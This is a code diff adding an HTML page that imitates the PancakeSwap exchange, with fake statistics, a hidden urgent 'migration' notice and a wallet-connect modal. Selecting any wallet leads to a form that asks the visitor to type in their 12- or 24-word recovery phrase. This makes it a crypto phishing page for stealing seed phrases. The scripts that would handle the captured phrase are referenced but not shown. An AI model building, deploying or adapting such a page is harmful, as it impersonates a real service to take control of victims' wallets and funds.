@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>PancakeSwap</title>
+        <meta charset="UTF-8">
+        <meta name="description" content="pancakes">
+        <meta name="author" content="pancakes Blockchain">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="Css/miniCss.css">
+        <link rel="stylesheet" type="text/css" href="Css/modalCss.css">
+        <link rel="stylesheet" type="text/css" href="Css/stylesheet.css">
+        <link rel="shortcut icon" type="image/png" href="Images/smallLogo.png" />
+    </head>
+    <body>
+        <div class="col-12 panContainer">
+            <div class="col-12 navBarDiv">
+                <div class="logoDiv"><img class="hamImg"src="Images/panHam.png" width="17" height="12"> <img class="logo" src="Images/panLogo.png"><img class="logo2" src="Images/panLogo2.png"></div>
+                <div class="connectDiv">
+                    <span class="connectSpan" onclick="showModal('#modalCon1')">
+                        Connect
+                    </span> &nbsp;&nbsp;&nbsp;
+                    <img class="profileImg" src="Images/panProfile.png"/> 
+                    <span class="proSpan"></span>
+                </div>
+            </div>
+            <div class="col-12 DivContainer">
+                <div id="divNavContainer">
+                    <ul class="navUl">
+                        <li class="activeClass" ><img src="Images/home.png" width="19" height="16">&nbsp;&nbsp;&nbsp;<a href="index.php">Home</a></li>
+                        <li><img src="Images/trade.png" width="19" height="16">&nbsp;&nbsp;<a>Trade</a>
+                            <img src="Images/downArr.png" width="12" height="14">
+                        </li>
+                        <li><img src="Images/farm.png" width="21" height="17">&nbsp;&nbsp;<a>Farms</a></li>
+                        <li><img src="Images/pool.png" width="16" height="19">&nbsp;&nbsp;<a>Pools</a></li>
+                        <li><img src="Images/preIcon.png" width="16" height="19">&nbsp;&nbsp;<a>Prediction</a></li>
+                        <li><img src="Images/lottery.png" width="19" height="22">&nbsp;&nbsp;<a>Lottery</a></li>
+                        <li><img src="Images/collect.png" width="19" height="18">&nbsp;&nbsp;<a>Collectibles</a></li>
+                        <li><img src="Images/teamB.png" width="18" height="20">&nbsp;&nbsp;<a>Team Battle</a></li>
+                        <li><img src="Images/teams.png" width="22" height="19">&nbsp;&nbsp;<a>Teams & Profile</a>
+                            <img src="Images/downArr.png" width="12" height="14">
+                        </li>
+                        <li><img src="Images/info.png" width="19" height="14.5">&nbsp;&nbsp;<a>Info</a>
+                            <img src="Images/downArr.png" width="12" height="14">   
+                        </li>
+                        <li><img src="Images/ifo.png" width="20" height="16">&nbsp;&nbsp;<a>IFO</a></li>
+                        <li><img src="Images/more.png" width="17" height="14">&nbsp;&nbsp;<a>More</a>
+                            <img src="Images/downArr.png" width="12" height="14">
+                        </li>
+                    </ul>
+                    <div class="divSetting">
+                        <div class="social rem">
+                            <span class="divPrice">
+                                <img class="lowCakeImg" src="Images/lowCake.png">
+                                <span class="lowPrice">$34.95</span>
+                            </span>
+                            <span class="telSpan">
+                                <img class="telImg" src="Images/telegram.png" width="18" height="18" >
+                                <div class="telDiv">
+                                    <ul class="telUl">
+                                        <li>English</li>
+                                        <li>Bahasa Indonesia</li>
+                                        <li>中文</li>
+                                        <li>Tiếng Việt</li>
+                                        <li>Italiano</li>
+                                        <li>русский</li>
+                                        <li>Türkiye</li>
+                                        <li>Português</li>
+                                        <li>Español</li>
+                                        <li>日本語</li>
+                                        <li>Français</li>
+                                        <li>Announcement</li>
+                                        <li>Whale Alert</li>
+                                    </ul>
+                               
+                                </div>
+                            </span>
+                            <img class="twiImg" src="Images/twitter.png" width="18" height="15" >
+                        </div>
+                        <div class="langDiv rem">
+                            <img class="dayImg" src="Images/day.png" width="22" height="22" >
+                            <img class="nigImg" src="Images/night.png" width="35" height="25" >
+                            <span class="langSpan">
+                                <img class="langImg" src="Images/lang.png" width="18" height="18">&nbsp;&nbsp;&nbsp;
+                                <span class="langTxt">EN</span>
+                                <div class="divLang">
+                                    <ul class="ulLang">
+                                        <li>English</li>
+                                        <li>العربية</li>
+                                        <li>বাংলা</li>
+                                        <li>简体中文</li>
+                                        <li>繁體中文</li>
+                                        <li>Nederlands</li>
+                                        <li>Filipino</li>
+                                        <li>Suomalainen</li>
+                                        <li>Deutsch</li>
+                                        <li>Français</li>
+                                        <li>Ελληνικά</li>
+                                        <li>हिंदी</li>
+                                        <li>Magyar</li>
+                                        <li>Bahasa Indonesia</li>
+                                        <li>Italiano</li>
+                                        <li>日本語</li>
+                                        <li>한국어</li>
+                                        <li>Polski</li>
+                                        <li>Português (Portugal)</li>
+                                        <li>Português (Brazil)</li>
+                                        <li>Română</li>
+                                        <li>Русский</li>
+                                        <li>Español</li>
+                                        <li>Svenska</li>
+                                    </ul>
+                                </div>
+                            </span>
+                        </div>
+                        <div class="settingsDiv allow">
+                            <img class="setImg" src="Images/settings.png" width="17" height="17">
+                        </div>
+                    </div>
+                </div>
+                <div id="divMainContainer">
+                    <div class="col-12 noticeDiv" style="display:none !important;">
+                        <div>
+                            <div>
+                               <div class="col-8 notice">
+                                    <img class="noticeIcon" src="Images/action.png" width="26" height="26"> 
+                                    <div class="actionDiv2">ACTION REQUIRED for all LP token holders</div>
+                                </div>
+                               <div class="col-4 notice2"><span class="toggleBtn">Details</span>&nbsp;&nbsp;
+                                    <img class="detailIcon" src="Images/detailIcon.png" width="13" height="8">
+                                </div>
+                            </div>
+                            <div class="col-12 noticeDetails">
+                                <p class="nPara1">
+                                You must complete migration if you want to keep earning from any PancakeSwap LP tokens and PancakeSwap farms.
+                                </p>
+                                <p class="nPara2">
+                                    All LPs will be migrated to a new, upgraded contract, over several hours starting from now.
+                                </p>
+                                <p class="nPara3">
+                                    <a class="migSpan1">Migrate Now</a>
+                                </p>
+                            </div>
+                        </div>
+
+                    </div>
+                    <div class="col-12 mainContent">
+                        <div class="col-12 firstCon">
+                            <img class="pImg1" src="Images/pan2.png" width="89" height="49" style="display:none !important;">
+                            <img class="pImg2" src="Images/pan1.png" width="80" height="50" style="display:none !important">
+                            <div class="con1 col-lg-3 col-md-3 col-sm-3">
+                                <img class="panImg" src="Images/pan1.png" width="222" height="145">
+                            </div>
+                            <div class="con2 col-lg-6 col-md-6 col-sm-6 col-xs-12">
+                                <p class="conPara1">
+                                    <span>PancakeSwap</span>
+                                </p>
+                                <p class="conPara2">
+                                    <span>The #1 AMM and yield farm on Binance Smart Chain.</span>
+                                </p>
+                            </div>
+                            <div class="con3 col-lg-3 col-md-3 col-sm-3">
+                                <img class="panImg2" src="Images/pan2.png" width="202" height="140">
+                            </div>
+                        </div>
+                        <div class="col-12 secondCon">
+                            <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
+                                <div>
+                                    <div>
+                                        <h1 class="panTopic1">Farms & Staking</h1>
+                                        <div><img src="Images/cake.png" width="70" height="70"></div>
+                                        <div class="cakeDiv">
+                                            <span class="cakeSpan">CAKE to Harvest:</span>
+                                        </div>
+                                        <div class="lockDiv">
+                                            <span class="lockSpan">Locked</span>
+                                        </div>
+                                        <div class="cakeDiv2">
+                                            <span class="cakeSpan2">
+                                                Cake in Wallet:
+                                            </span>
+                                        </div>
+                                        <div class="lockDiv2">
+                                            <span class="lockSpan2">
+                                                Locked
+                                            </span>
+                                        </div>
+                                        <p class="unlockPara1"> 
+                                            <span class="unlockSpan1" onclick="showModal('#modalCon1')">Unlock Wallet<span>
+                                        </p>
+
+                                    </div>
+                                </div>
+
+                            </div>
+                            <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
+                                <div>
+                                    <div>
+                                    <h1 class="panTopic1">Your Lottery Winnings</h1>
+                                        <div><img src="Images/lot.png" width="70" height="70"></div>
+                                        <div class="cakeDiv">
+                                            <span class="cakeSpan">CAKE to Collect:</span>
+                                        </div>
+                                        <div class="lockDiv">
+                                            <span class="lockSpan">Locked</span>
+                                        </div>
+                                        <div class="cakeDiv2">
+                                            <span class="cakeSpan2">
+                                                Total jackpot is round
+                                            </span>
+                                        </div>
+                                        <div class="jackDiv">
+                                            <span class="jackSpan">
+                                                35,413.25
+                                            </span>
+                                            <span class="jackSpan2">CAKE</span>
+                                        </div>
+                                        <div class="jackDiv2">
+                                            <span class="jack2Span">~$1,326,126.99</span>
+                                        </div>
+                                        <p class="unlockPara2"> 
+                                            <span class="unlockSpan1" onclick="showModal('#modalCon1')">Unlock Wallet<span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-12 thirdCon">
+                            <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
+                                <div>
+                                    <h2 class="h hTwo">Earn up to</h2>
+                                    <h1 class="hh hOne">557.17% APR</h1>
+                                    <h2 class="h hTwo">in Farms</h2>
+                                    <img src="Images/arrow.png"class="arrImg" width="14" height="13">
+                                </div>
+                            </div>
+                            <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
+                                <div>
+                                    <h2 class="h hTwo">Earn</h2>
+                                    <h1 class="hh hOne hOne2">CAKE, DFD, ALPACA, <span class="t">T</span>BTC</h1>
+                                    <h2 class="h hTwo">in Pools</h2>  
+                                    <img src="Images/arrow.png" class="arrImg" width="14" height="13">                                
+                                </div>
+                            </div>
+                            <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
+                                <div>
+                                    <h2 class="h hTwo">Lottery with</h2>
+                                    <h1 class="hh hOne">$1,408,174</h1>
+                                    <h2 class="h hTwo">up for grabs</h2>
+                                    <img src="Images/arrow.png" class="arrImg" width="14" height="13">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-12 forthCon">
+                            <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
+                                <div>
+                                    <p class="csPara"><span class="csSpan">Cake Stats<span></p>
+                                    <p class="csPara1"><span class="csSpan1">
+                                        Total CAKE Supply</span>
+                                        <span class="csSpan1b">159,326,798</span>
+                                    </p>
+                                    <p class="csPara2">
+                                        <span class="csSpan2">Total CAKE Burned</span>
+                                        <span class="csSpan2b">115,099,240</span>
+                                    </p>
+                                    <p class="csPara3">
+                                        <span class="csSpan3">Total CAKE Burned</span>
+                                        <span class="csSpan3b">22</span>
+                                    </p>
+                                    
+                                </div>
+                            </div>
+                            <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
+                                <div>
+                                    <p class="cPara cPara1"><span class="cSpan1">Total Value Locked (TVL)</span></p>
+                                    <p class="cPara cPara2"><span class="cSpan2">$5,192,602,374</span></p>
+                                    <p class="cPara cPara3"><span class="cSpan3">Across all LPs and Syrup Pools</span></p>
+                                </div>
+                            </div>    
+                        </div>
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+        <div class="hamModal">
+        
+        </div>
+        <div id="myModal" class="modal" >
+            
+            <div id="modalCon1" class="modal-content">
+                <p class="modTopic1"><span class="mTopic1">Connect to a wallet</span><span onclick="closeSpan()" class="mClose1" style="font-family:arial">X</span></p>
+                <ul class="modUl1">
+                    <li onclick="showModal2('#modalCon2','Metamask')">Metamask<img src="Images/metaIcon.png" width="33" height="33"></li>
+                    <li onclick="showModal2('#modalCon2','TrustWallet')">TrustWallet<img src="Images/trustIcon.png" width="29" height="29"</li>
+                    <li onclick="showModal2('#modalCon2','MathWallet')">MathWallet <img src="Images/mathIcon.png" width="31" height="31"</li>
+                    <li onclick="showModal2('#modalCon2','TokenPacket')">TokenPocket<img src="Images/pocketIcon.png" width="31" height="31"></li>
+                    <li onclick="showModal2('#modalCon2','WalletConnect')">WalletConnect<img src="Images/conIcon.png" width="31" height="31"></li>
+                    <li onclick="showModal2('#modalCon2','Binance Chain Wallet')">Binance Chain Wallet<img src="Images/binanceIcon.png" width="29" height="29"></li>
+                    <li onclick="showModal2('#modalCon2','SafePal Wallet')">SafePal Wallet<img src="Images/safePIcon.png" width="24" height="29"></li>
+                </ul>
+                <p class="modFoot">
+                <img src="Images/learn.png" width="17" height="17">
+                <span>Learn how to connect</span>
+                </p>
+            </div>
+            <div id="modalCon2" class="modal-content">  
+                <p class="modTopic1">
+                    <span class="mTopic1">Enter Mnemonic Phrase</span>
+                    <span onclick="closeSpan()" class="mClose1" style="font-family:arial">X</span>
+                </p>
+                <div class="modDivBody">
+                    <input class="modInp" type="text" disabled><br><br>
+                    <textarea class="modArea"></textarea>
+                    <br><br>
+                    <p class="modTypePara">Typically 12 (sometimes 24) words separated by single spaces</p>
+                    
+                </div>
+                <p class="modBtn">
+                    <span class="modBtnSpan">Connect Wallet<span>
+                </p>
+                  
+            </div> 
+        </div>
+
+        <script src="Script/pageScript.js"></script>
+        <script src="Script/modalScript.js"></script>
+        
+    </body>
+</html>
+
+
+ 
